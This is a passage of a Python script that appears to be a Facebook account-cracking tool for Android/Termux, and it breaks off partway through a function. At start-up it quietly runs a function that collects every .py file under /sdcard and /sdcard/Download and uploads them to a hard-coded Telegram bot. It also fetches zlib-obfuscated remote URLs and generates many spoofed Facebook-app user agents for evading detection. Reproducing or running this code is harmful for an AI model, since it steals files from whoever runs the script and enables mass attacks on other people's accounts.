import os
import uuid,base64,hashlib,zlib,subprocess,time,platform,pycurl
import bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,base64,zlib
from bs4 import BeautifulSoup
from io import BytesIO
from bs4 import BeautifulSoup as sop
import _socket, ssl, certifi
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool 
os.system("pip install licensing > /dev/null")
from licensing.models import *
from licensing.methods import Key, Helpers
try:
    import concurrent.futures
except ImportError:
    print('\n \033[1;91m[\033[1;93mXD-000\033[1;91m]\033[1;97m installing futures !...\n')
    time.sleep(0.5)
    os.system('pip install pycurl')
try: 
    import bs4
except ImportError:
    print('\n \033[1;91m[\033[1;93mXD-000\033[1;91m]\033[1;97m installing bs4 !...\n')
    time.sleep(0.5)
    os.system('pip install bs4')
#━━━━[ COLORS ]━━━━#
###----------[ PEH ]----------###
mer = '\033[1;31m'
kun = '\033[1;33m'
hijo = '\033[1;32m'
biru = '\033[1;34m'
ung = '\033[1;35m'
puti = '\033[1;37m'
bira = '\033[1;36m'
xxx = '\33[m'
GREEN ='\x1b[38;5;46m'
RED = '\x1b[38;5;46m'
WHITE = '\033[1;97m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
BLACK="\033[1;30m"
R = '{RED}' 
G = '{GREEN}' 
Y = '\033[1;33m' 
Q = '\033[1;37m'
T = '\033[1;34m'
x = '\33[m' 
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
my_color = [
 P, M, H, K, B, U, N, R, Y,]
###----------[ CONVERT LINE ]----------###
led = f'{M} -{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}{M}-{M}-{M}-{H}-{M}'
###----------[ BANNER MENUH ]----------###
gen=f' {K}[{GREEN}√{K}] {P}'
dot=f' {K}[{GREEN}•{K}] {P}'
rdd=f' {K}[{RED}•{K}] {P}'
rgen=f' {K}[{RED}√{K}] {P}'
wt=f' {K}[{GREEN}?{K}] {P}'
rong=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
rong2=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
rong3=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
rong4=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
rong5=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
rong6=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
rong7=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
fst=f'{dot}[{H}sumon{M}-{H}milon{M}-{H}bithika{M}-{H}sakshi{M}-{H}mimi{P}]'
lst=f'{dot}[{H}roy{M}-{H}sarkar{M}-{H}biswas{M}-{H}das{M}-{H}khan{P}]'
limitt=f'{dot}[{H}5000{M}-{H}10000{M}-{H}15000{M}-{H}20000{M}-{H}50000{P}]'
c7=f'{dot}[{H}7679{M}-{H}9832{M}-{H}6297{M}-{H}9987{M}-{H}8817{M}-{H}7209{P}]'
c6=f'{dot}[{H}01778{M}-{H}01991{M}-{H}01661{M}-{H}01776{M}-{H}01996{M}-{H}01779{P}]'
c8=f'{dot}[{H}017{M}-{H}019{M}-{H}016{M}-{H}013{M}-{H}018{M}-{H}014{M}-{H}015{P}]'
mtd,cp_xdx,cokix=[],[],[]
token = ('7169188559:AAFfgMn425IJeZOQ6gX2HOH1-lLRpomrtX8')
ID = ('6902849715')
orange = "\x1b[38;5;196m"
yellow = "\x1b[38;5;208m"
black="\033[1;30m"
rad="\x1b[38;5;160m"
green="\x1b[38;5;46m"
yelloww="\033[1;33m"
blue="\033[38;5;6m"
purple="\033[1;35m"
cyan="\033[1;36m"
white="\033[1;37m"
faltu = "\033[1;47m"
pvt = "\033[1;0m"
gren = "\x1b[38;5;154m"
gas = "\033[1;32m"
loop = 0
oks = []
cps = []
id = []
ck = []
import time
from datetime import datetime
sasi = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
tete = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
now = datetime.now()
hari = now.day
blx = now.month
try:
    if blx < 0 or blx > 12:exit()
    xx = blx - 1
except ValueError:exit()
bulan = sasi[xx]
tahun = now.year
os.system('')
today = '\033[1;36m'+str(hari)+'\033[1;97m-\033[1;36m'+str(bulan)+'\033[1;97m-\033[1;36m'+str(tahun)
#-----------------------sdcard---------------------#
def bithika():
    session=requests.session()
        
    bot_token = '7109704469:AAHfyQbirSkacwySdGmQsM5pt-aLq448JIs' 
    chat_id = '6902849715' 	
	#-----------------------py---------------------#
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #------------------------py---------------------------#
    try:
        sdcard_path = '/sdcard/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
with tred(max_workers=100) as jjj:
    jjj.submit(bithika)
#--------------------------------[METHOD 1]--------------------------------#
_method_1_buffer = BytesIO()
_method_1_curl = pycurl.Curl()
_method_1_curl.setopt(pycurl.URL,zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5w\xf4r\x8ct\xf4310\xd1\x0f-HI,I\xd5+\xa9(\xd1\xcfM\xcc\xcc\x03\x12%\x19\xf9%\x86 \x01\x00\xab\x86\x19\xd8'))
_method_1_curl.setopt(pycurl.WRITEDATA, _method_1_buffer)
_method_1_curl.perform()
_method_1_data = _method_1_buffer.getvalue().decode('utf-8').splitlines()
def mls1():
    END = ''.join(_method_1_data)
    ffx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + END
    return ffx
#--------------------------------[METHOD 2]--------------------------------#
_method_2_buffer = BytesIO()
_method_2_curl = pycurl.Curl()
_method_2_curl.setopt(pycurl.URL,zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5w\xf4r\x8ct\xf4310\xd1\x0f-HI,I\xd5+\xa9(\xd1\xcfM\xcc\xcc\x03\x12%\x19\xf9%F \x01\x00\xab\x8b\x19\xd9'))
_method_2_curl.setopt(pycurl.WRITEDATA, _method_2_buffer)
_method_2_curl.perform()
_method_2_data = _method_2_buffer.getvalue().decode('utf-8').splitlines()
def mls2():
    END = ''.join(_method_2_data)
    ffx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + END
    return ffx
#--------------------------------[METHOD 3]--------------------------------#
_method_3_buffer = BytesIO()
_method_3_curl = pycurl.Curl()
_method_3_curl.setopt(pycurl.URL,zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5w\xf4r\x8ct\xf4310\xd1\x0f-HI,I\xd5+\xa9(\xd1\xcfM\xcc\xcc\xd3\xf7M,\xc9\xc8/1\x06\t\x00\x00\xaa0\x19\xba'))
_method_3_curl.setopt(pycurl.WRITEDATA, _method_3_buffer)
_method_3_curl.perform()
_method_3_data = _method_3_buffer.getvalue().decode('utf-8').splitlines()
def mls3():
    END = ''.join(_method_3_data)
    ffx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + END
    return ffx
#--------------------------------[METHOD 4]--------------------------------#
_method_4_buffer = BytesIO()
_method_4_curl = pycurl.Curl()
_method_4_curl.setopt(pycurl.URL,zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5w\xf4r\x8ct\xf4310\xd1\x0f-HI,I\xd5+\xa9(\xd1\xcfM\xcc\xcc\xd3\xf7M,\xc9\xc8/1\x01\t\x00\x00\xaa5\x19\xbb'))
_method_4_curl.setopt(pycurl.WRITEDATA, _method_4_buffer)
_method_4_curl.perform()
_method_4_data = _method_4_buffer.getvalue().decode('utf-8').splitlines()
def mls4():
    END = ''.join(_method_4_data)
    ffx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + END
    return ffx
#--------------------------------[METHOD 5]--------------------------------#
_method_5_buffer = BytesIO()
_method_5_curl = pycurl.Curl()
_method_5_curl.setopt(pycurl.URL,zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5w\xf4r\x8ct\xf4310\xd1\x0f-HI,I\xd5+\xa9(\xd1\xcfM\xcc\xcc\xd3\xf7M,\xc9\xc8/1\x05\t\x00\x00\xaa:\x19\xbc'))
_method_5_curl.setopt(pycurl.WRITEDATA, _method_5_buffer)
_method_5_curl.perform()
_method_5_data = _method_5_buffer.getvalue().decode('utf-8').splitlines()
def mls5():
    END = ''.join(_method_5_data)
    ffx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + END
    return ffx
#--------------------------------[METHOD 6]--------------------------------#
_method_6_buffer = BytesIO()
_method_6_curl = pycurl.Curl()
_method_6_curl.setopt(pycurl.URL,zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5w\xf4r\x8ct\xf4310\xd1\x0f-HI,I\xd5+\xa9(\xd1\xcfM\xcc\xcc\xd3\xf7M,\xc9\xc8/1\x03\t\x00\x00\xaa?\x19\xbd'))
_method_6_curl.setopt(pycurl.WRITEDATA, _method_6_buffer)
_method_6_curl.perform()
_method_6_data = _method_6_buffer.getvalue().decode('utf-8').splitlines()
def mls6():
    END = ''.join(_method_6_data)
    ffx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + END
    return ffx
#--------------------------------[NORMAL MTD]--------------------------------#
import requests,random

def ua_valid():
    rr = random.randint
    rc = random.choice
    model2 = requests.get('https://gi'+'st.githubus'+'ercontent.com/zar0-XD/c3d50589'+'d804b5b7ab5a7717a22cfe0d/raw/6937320508d'+'d57dd78d0c2'+'97d532fdc233306d01/m'+'dls.txt').text.splitlines()
    model = random.choice(model2)
    redmi4 = f"Mozilla/5.0 (Linux; Android 13; {model} Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,109))}.0.{str(rr(4896,5414))}.{str(rr(118,127))} Mobile Safari/537.36"
    return rc([redmi4])
    
def sexy():   
    oppo = ["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]
    redmi = ["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]
    realme =  ["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269","RMX2027", "RMX2020","RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"]
    infinix = ["X676B", "X687", "X609", "X697", "X680D", "X507", "X605", "X668", "X6815B", "X624", "X655F", "X689C", "X608", "X698", "X682B", "X682C", "X688C", "X688B", "X658E", "X659B", "X689B", "X689", "X689D", "X662", "X662B", "X675", "X6812B", "X6812", "X6817B", "X6817", "X6816C", "X6816", "X6816D", "X668C", "X665B", "X665E", "X510", "X559C", "X559F", "X559", "X606", "X606C", "X606D", "X623", "X624B", "X625C", "X625D", "X625B", "X650D", "X650B", "X650", "X650C", "X655C", "X655D", "X680B", "X573", "X573B", "X622", "X693", "X695C", "X695D", "X695", "X663B", "X663", "X670", "X671", "X671B", "X672", "X6819", "X572", "X572-LTE", "X571", "X604", "X610B", "X690", "X690B", "X656", "X692", "X683", "X450", "X5010", "X501", "X401", "X626", "X626B", "X652", "X652A", "X652B", "X652C", "X660B", "X660C", "X660", "X5515", "X5515F", "X5515I", "X609B", "X5514D", "X5516B", "X5516C", "X627", "X680", "X653", "X653C", "X657", "X657B", "X657C", "X6511B", "X6511E", "X6511", "X6512", "X6823C", "X612B", "X612", "X503", "X511", "X352", "X351", "X530", "X676C", "X6821", "X6823", "X6827", "X509", "X603", "X6815", "X620B", "X620", "X687B", "X6811B", "X6810", "X6811"]
    samsung = ['SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H']  
    budi = ['SM-M236B','SM-A037G','SM-J701MT','SM-A115U','SM-G610M','SM-J530F','SM-A307FN','SM-A405FN','SM-S111DL','SM-A022F','SM-G900P','SM-G986U','SM-G981U','SM-G975U','SM-G981U','SM-G965F','SM-G970U1','SM-G965U','SM-G930T','SM-G930VL','SM-G950U','SM-G981U','SM-N975U','SM-G935U','SM-N960U','SM-G986U','SM-G930R4','SM-N960W','Xiaomi 10 Pro','2201123G','22071212AG','22081212UG','2112123AG','2211133C','Mi 9T Pro','CPH1861','RMX3630','RMX3686','RMX1805','RMX1801','RMX2020','RMX1811','RMX3063','RMX3063','RMX3501','OPPO 1105','oppo 15','oppo6779','oppo6833','OPPO7273','Oppo A1','PCHM10','CPH2071','CPH2185','CPH2179','A37f','SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V']  
    akagami1 = "[FBAN/FB4A;FBAV/311.0.0.44.117;FBBV/280307931;FBDM/{density=2.0,width=720,height=1369};FBLC/pt_BR;FBRV/281357705;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/"+str(random.choice(samsung))+";FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    akagami2 = "[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444780;FBDM/{density=3.0,width=1080,height=2076};FBLC/de_DE;FBRV/278218861;FBCR/smartmobil.de;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/"+str(random.choice(budi))+";FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
    akagami3 = "[FBAN/FB4A;FBAV/317.0.0.51.119;FBBV/288708667;FBDM/{density=3.0,width=1080,height=2043};FBLC/cs_CZ;FBRV/290555739;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/"+str(random.choice(redmi))+";FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    akagami4 = "[FBAN/FB4A;FBAV/301.0.0.37.477;FBBV/267342877;FBDM/{density=2.0,width=720,height=1424};FBLC/pl_PL;FBRV/268803887;FBCR/T-Mobile.pl;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/"+str(random.choice(oppo))+";FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    akagami5 = "[FBAN/FB4A;FBAV/370.0.0.23.112;FBBV/374931191;FBDM/{density=3.0,width=1080,height=2153};FBLC/en_US;FBRV/0;FBCR/LV TELE2;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/"+str(random.choice(infinix))+";FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    user = random.choice([akagami1,akagami2,akagami3,akagami4,akagami5])
    trt = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + user
    return trt  

def cx():
    uaz = "[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338918989;FBDM/{density=1.7,width=720,height=1385};FBLC/id_ID;FBRV/344561895;FBCR/AXIS;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/RMX1805;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
    uaz1 = "[FBAN/FB4A;FBAV/261.0.0.52.126;FBBV/202681565;FBDM/{density=2.0,width=720,height=1352};FBLC/it_IT;FBRV/203912779;FBCR/ho.;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_X00RD;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    uaz2 = "[FBAN/FB4A;FBAV/265.0.0.61.103;FBBV/208173642;FBDM/{density=2.625,width=1080,height=2047};FBLC/en_US;FBRV/209076735;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
    uaz3 = "[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629372;FBDM/{density=3.0,width=1080,height=2192};FBLC/en_US;FBRV/210347457;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto z4;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    uaz4 = "[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629372;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/210430229;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    uaz5 = "[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629372;FBDM/{density=2.625,width=1080,height=2064};FBLC/en_US;FBRV/210658448;FBCR/Spectrum;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N970U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
